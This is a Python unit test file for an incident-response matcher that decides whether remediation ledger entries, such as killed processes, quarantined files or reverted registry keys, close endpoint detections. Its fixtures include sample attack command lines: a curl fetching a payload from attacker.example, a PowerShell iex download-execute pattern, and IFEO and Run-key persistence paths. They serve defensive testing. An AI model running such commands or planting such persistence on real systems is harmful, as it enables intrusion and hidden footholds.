"""Unit tests for the IR ledger → detection matcher.

Per CLAUDE.md (memory: "extras_ir_close_remediated matcher contract"), every
new remediation primitive needs three changes in lockstep:

  1. a ``kind ==`` branch in ``ledger_matcher.py``
  2. a Phase 2 instruction in ``lib/eyas-tools/playbooks/ir.ts`` telling the agent to emit
     that ledger entry on success
  3. a unit test in this file exercising the new branch

The tests below cover every kind currently registered. Add a test next to
its sibling when introducing a new kind.

Run:
    python3 -m pytest falcon-extras/ir/test_ledger_matcher.py
    python3 falcon-extras/ir/test_ledger_matcher.py
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))
from ledger_matcher import ledger_entry_matches_alert  # noqa: E402


def _alert(**kwargs):
    return {"behaviors": [], **kwargs}


# ---------------------------------------------------------------------------
# Host/network state changes never close a detection
# ---------------------------------------------------------------------------
# containment / lift / reboot are not per-detection remediation: isolating or
# rebooting a host doesn't remove the threat (persistence survives a reboot).
# A blanket "I contained the host" entry must NOT close the open-detection
# queue — otherwise the F2b release gate (which re-checks whether the Phase-0
# originals are still open) would be defeated by a routine containment.


def test_host_contained_matches_nothing():
    m, _ = ledger_entry_matches_alert({"kind": "host_contained"}, _alert())
    assert not m


def test_host_lifted_matches_nothing():
    m, _ = ledger_entry_matches_alert({"kind": "host_lifted"}, _alert())
    assert not m


def test_host_rebooted_matches_nothing():
    m, _ = ledger_entry_matches_alert({"kind": "host_rebooted"}, _alert())
    assert not m


def test_host_wide_entry_does_not_close_alert_with_real_evidence():
    # Regression for the F2b-gate-defeat: even when the alert carries real
    # artifacts, a host-wide-style entry alone closes nothing — only a specific
    # per-artifact ledger entry does. (The matching process_killed entry is
    # ABSENT here, so the alert must stay open.)
    alert = _alert(
        process_id="42",
        behaviors=[{"filename": "evil.exe", "sha256": "e" * 64}],
    )
    for kind in ("host_contained", "host_lifted", "host_rebooted"):
        m, _ = ledger_entry_matches_alert({"kind": kind}, alert)
        assert not m, f"{kind} must not close a detection on its own"


# ---------------------------------------------------------------------------
# process_killed
# ---------------------------------------------------------------------------


def test_process_killed_pid_match():
    alert = _alert(process_id="987654321")
    m, r = ledger_entry_matches_alert(
        {"kind": "process_killed", "pid": "987654321"}, alert
    )
    assert m and "pid=987654321" in r


def test_process_killed_pid_int_vs_string_compares_clean():
    alert = _alert(process_id=987654321)
    m, _ = ledger_entry_matches_alert(
        {"kind": "process_killed", "pid": "987654321"}, alert
    )
    assert m


def test_process_killed_image_basename_match():
    # Matches against the alert's PROCESS IMAGE (behaviors[].filename /
    # filepath), not a string that merely appears in a command line.
    alert = _alert(
        behaviors=[{"filename": "evil.exe", "filepath": r"C:\Windows\System32\evil.exe"}]
    )
    m, r = ledger_entry_matches_alert(
        {"kind": "process_killed", "pid": "111", "image": r"D:\Tools\evil.exe"},
        alert,
    )
    assert m and "evil.exe" in r


def test_process_killed_interpreter_not_matched_by_cmdline_mention():
    # Regression: a killed common interpreter (cmd.exe) must NOT close an
    # unrelated detection just because its cmdline mentions cmd.exe. Process
    # identity is pid + image only — no cmdline fallback for process_killed.
    alert = _alert(
        process_id="555",
        cmdline=r"C:\Windows\System32\cmd.exe /c whoami",
        behaviors=[{"filename": "notepad.exe"}],
    )
    m, _ = ledger_entry_matches_alert(
        {"kind": "process_killed", "pid": "111", "image": "cmd.exe"}, alert
    )
    assert not m


def test_process_killed_no_match_returns_false():
    alert = _alert(process_id="123", behaviors=[{"filename": "benign.exe"}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "process_killed", "pid": "999", "image": "evil.exe"}, alert
    )
    assert not m


# ---------------------------------------------------------------------------
# file_quarantined / file_deleted
# ---------------------------------------------------------------------------


def test_file_quarantined_sha256_match():
    sha = "a" * 64
    alert = _alert(behaviors=[{"sha256": sha}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "file_quarantined", "sha256": sha.upper()}, alert
    )
    assert m


def test_file_quarantined_md5_match():
    md5 = "b" * 32
    alert = _alert(behaviors=[{"md5": md5}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "file_deleted", "md5": md5}, alert
    )
    assert m


def test_file_quarantined_path_in_cmdline():
    alert = _alert(cmdline=r"powershell -c iex (irm C:\Temp\bad.zip)")
    m, _ = ledger_entry_matches_alert(
        {"kind": "file_quarantined", "path": r"C:\Temp\bad.zip"}, alert
    )
    assert m


def test_file_quarantined_basename_in_cmdline_when_path_misses():
    alert = _alert(cmdline=r"Expand-Archive bad.zip")
    m, r = ledger_entry_matches_alert(
        {"kind": "file_quarantined", "path": r"D:\Stage\bad.zip"}, alert
    )
    assert m and "filename=bad.zip" in r


def test_file_deleted_short_basename_below_floor_no_match():
    # "a.exe" (5 chars) is below the bounded-token floor — a different file at
    # a different path must not close a detection just because the short
    # basename collides somewhere in the cmdline.
    alert = _alert(cmdline=r"running C:\Temp\a.exe now")
    m, _ = ledger_entry_matches_alert(
        {"kind": "file_deleted", "path": r"D:\Other\a.exe"}, alert
    )
    assert not m


# ---------------------------------------------------------------------------
# folder_deleted
# ---------------------------------------------------------------------------


def test_folder_deleted_path_in_cmdline():
    alert = _alert(cmdline=r"Expand-Archive -DestinationPath C:\extracted-tools")
    m, _ = ledger_entry_matches_alert(
        {"kind": "folder_deleted", "path": r"C:\extracted-tools"}, alert
    )
    assert m


# ---------------------------------------------------------------------------
# registry_reverted / ifeo_removed
# ---------------------------------------------------------------------------


def test_registry_reverted_matches_behavior_ioc_value():
    path = (
        r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
        r"\Image File Execution Options\sethc.exe\Debugger"
    )
    alert = _alert(behaviors=[{"ioc_value": path}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "registry_reverted", "path": path}, alert
    )
    assert m


def test_registry_reverted_short_ioc_fragment_does_not_match():
    # Regression: the old bidirectional substring (`iv in path`) let a short,
    # generic behavior ioc_value fragment close a detection against a long,
    # specific ledger path. "run" appears inside the Run-key path but is not a
    # delimited match for the full path — must NOT close.
    alert = _alert(behaviors=[{"ioc_value": "run"}])
    m, _ = ledger_entry_matches_alert(
        {
            "kind": "registry_reverted",
            "path": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp",
        },
        alert,
    )
    assert not m


def test_registry_reverted_prefix_path_does_not_overclose():
    # Regression: "…\Run\EvilApp" must not close a detection about
    # "…\Run\EvilAppData" — bounded-token rejects the trailing-word-char
    # continuation that a bare `path in iv` substring would have matched.
    alert = _alert(
        behaviors=[
            {"ioc_value": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilAppData"}
        ]
    )
    m, _ = ledger_entry_matches_alert(
        {
            "kind": "registry_reverted",
            "path": r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp",
        },
        alert,
    )
    assert not m


def test_registry_reverted_embedded_in_quoted_ioc_value_matches():
    # The full path embedded in a larger ioc_value (quoted reg command) still
    # matches — the bounded token allows quote/space boundaries.
    path = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\EvilApp"
    alert = _alert(behaviors=[{"ioc_value": f'reg delete "{path}" /f'}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "registry_reverted", "path": path}, alert
    )
    assert m


def test_ifeo_removed_matches_image_in_ioc_value():
    alert = _alert(
        behaviors=[
            {
                "ioc_value": (
                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
                    r"\Image File Execution Options\sethc.exe\Debugger"
                )
            }
        ]
    )
    m, _ = ledger_entry_matches_alert(
        {"kind": "ifeo_removed", "image": "sethc.exe"}, alert
    )
    assert m


# ---------------------------------------------------------------------------
# ioa_pattern_excluded / ml_exclusion_added / ioc_added
# ---------------------------------------------------------------------------


def test_ioa_pattern_excluded_pattern_id_match():
    alert = _alert(behaviors=[{"pattern_id": 12345}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "ioa_pattern_excluded", "pattern_id": "12345"}, alert
    )
    assert m


def test_ml_exclusion_added_sha_match():
    sha = "c" * 64
    alert = _alert(behaviors=[{"sha256": sha}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "ml_exclusion_added", "sha256": sha}, alert
    )
    assert m


def test_ioc_added_hash_match():
    sha = "d" * 64
    alert = _alert(behaviors=[{"sha256": sha}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "ioc_added", "type": "sha256", "value": sha}, alert
    )
    assert m


def test_ioc_added_domain_substring_match():
    alert = _alert(cmdline="curl https://attacker.example/payload")
    m, _ = ledger_entry_matches_alert(
        {"kind": "ioc_added", "type": "domain", "value": "attacker.example"},
        alert,
    )
    assert m


# ---------------------------------------------------------------------------
# rat_uninstalled / service / scheduled_task / wmi
# ---------------------------------------------------------------------------


def test_rat_uninstalled_image_basename_match():
    # Matches the binary by image basename (same discipline as process_killed).
    alert = _alert(
        behaviors=[{"filename": "AnyDesk.exe", "filepath": r"C:\Program Files\AnyDesk\AnyDesk.exe"}]
    )
    m, _ = ledger_entry_matches_alert(
        {"kind": "rat_uninstalled", "product": "AnyDesk", "image": "AnyDesk.exe"},
        alert,
    )
    assert m


def test_rat_uninstalled_image_token_in_cmdline_match():
    alert = _alert(cmdline=r"C:\Program Files\AnyDesk\AnyDesk.exe --service")
    m, _ = ledger_entry_matches_alert(
        {"kind": "rat_uninstalled", "product": "AnyDesk", "image": "AnyDesk.exe"},
        alert,
    )
    assert m


def test_rat_uninstalled_product_only_no_match():
    # The generic `product` substring was dropped — the bare product word in an
    # unrelated path must not close a detection without the binary image/token.
    alert = _alert(cmdline=r"echo installing AnyDeskHelper update")
    m, _ = ledger_entry_matches_alert(
        {"kind": "rat_uninstalled", "product": "AnyDesk", "image": "AnyDesk.exe"},
        alert,
    )
    assert not m


def test_service_removed_name_in_cmdline():
    alert = _alert(cmdline="sc start MaliciousSvc")
    m, _ = ledger_entry_matches_alert(
        {"kind": "service_removed", "service_name": "MaliciousSvc"}, alert
    )
    assert m


def test_service_removed_bounded_token_not_substring():
    # "backup" (>=floor) appears INSIDE "backupperd" — delimited-token matching
    # must reject it; a bare substring `in` check would have over-closed.
    alert = _alert(cmdline=r"C:\Tools\backupperd.exe run")
    m, _ = ledger_entry_matches_alert(
        {"kind": "service_removed", "service_name": "backup"}, alert
    )
    assert not m


def test_service_removed_short_name_below_floor_no_match():
    # 3-char service name "svc" is below the floor — must not substring-close.
    alert = _alert(cmdline="start svchost service manager")
    m, _ = ledger_entry_matches_alert(
        {"kind": "service_removed", "service_name": "svc"}, alert
    )
    assert not m


def test_wmi_persistence_removed_filter_name_match():
    alert = _alert(behaviors=[{"ioc_value": "EventFilter:WeeklyImplantBeacon"}])
    m, _ = ledger_entry_matches_alert(
        {"kind": "wmi_persistence_removed", "filter_name": "WeeklyImplantBeacon"},
        alert,
    )
    assert m


def test_wmi_persistence_short_name_below_threshold_no_match():
    # 3-char names are too generic — substring on "abc" would over-close.
    alert = _alert(cmdline="abc xyz")
    m, _ = ledger_entry_matches_alert(
        {"kind": "wmi_persistence_removed", "filter_name": "abc"}, alert
    )
    assert not m


# ---------------------------------------------------------------------------
# Unknown / "other" never matches
# ---------------------------------------------------------------------------


def test_other_kind_never_matches():
    m, _ = ledger_entry_matches_alert(
        {"kind": "other", "note": "operator did the thing"}, _alert()
    )
    assert not m


def test_unknown_kind_never_matches():
    m, _ = ledger_entry_matches_alert({"kind": "magic_fix"}, _alert())
    assert not m


def test_empty_kind_never_matches():
    m, _ = ledger_entry_matches_alert({}, _alert())
    assert not m


def main() -> int:
    tests = [v for k, v in globals().items() if k.startswith("test_") and callable(v)]
    failed = 0
    for fn in tests:
        try:
            fn()
            print(f"  ok   {fn.__name__}")
        except AssertionError as e:
            failed += 1
            print(f"  FAIL {fn.__name__}: {e}")
        except Exception as e:
            failed += 1
            print(f"  ERR  {fn.__name__}: {type(e).__name__}: {e}")
    print(f"\n{len(tests) - failed}/{len(tests)} passed")
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
